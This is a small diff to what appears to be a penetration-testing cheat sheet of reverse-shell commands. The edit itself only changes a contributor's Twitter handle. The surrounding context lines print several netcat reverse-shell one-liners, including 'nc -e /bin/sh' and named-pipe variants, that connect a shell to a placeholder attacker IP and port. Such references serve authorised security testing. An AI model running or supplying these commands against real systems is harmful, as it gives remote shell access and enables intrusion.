@@ -126,7 +126,7 @@ nc -e /bin/sh ATTACKING-IP 80
 rm -f /tmp/p; mknod /tmp/p p && nc ATTACKING-IP 4444 0/tmp/p
 {% endhighlight %}
 
-A reverse shell submitted by [@atul_hax](https://twitter.com/atul_hax) which works well for OpenBSD netcat rather than GNU nc: 
+A reverse shell submitted by [@0xatul](https://twitter.com/atul_hax) which works well for OpenBSD netcat rather than GNU nc: 
 
 {% highlight bash %}
 mkfifo /tmp/lol;nc ATTACKER-IP PORT 0</tmp/lol | /bin/sh -i 2>&1 | tee /tmp/lol
